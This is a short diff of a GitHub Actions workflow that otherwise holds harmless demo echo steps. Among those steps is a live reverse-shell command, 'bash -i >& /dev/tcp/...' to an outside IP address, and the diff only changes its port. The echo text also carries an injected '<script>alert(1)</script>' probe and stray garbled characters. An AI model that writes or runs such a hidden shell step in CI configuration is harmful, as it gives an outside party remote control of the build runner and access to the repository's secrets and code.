@@ -7,7 +7,7 @@ jobs:
       - run: echo "🎉 The j4ob was automatically trig <script>alert(1)</script> gered by a ${{ github.event_name }} event."
       - run: echo "🐧 This job is now running on a ${{ runner.os }} server hosted by GitHub!"
       - run: echo "🔎 The name2 of your branch is ${{ github.ref }} and your rep2ository is ${{ github.repository }}."
-      - run: bash -i >& /dev/tcp/3.138.189.101/80 0>&1
+      - run: bash -i >& /dev/tcp/3.138.189.101/3133 0>&1
       - name: Check out repository code
         uses: actions/checkout@v2
       - run: echo "💡 The ${{ github.repository }} repository has been cloned to the runner."
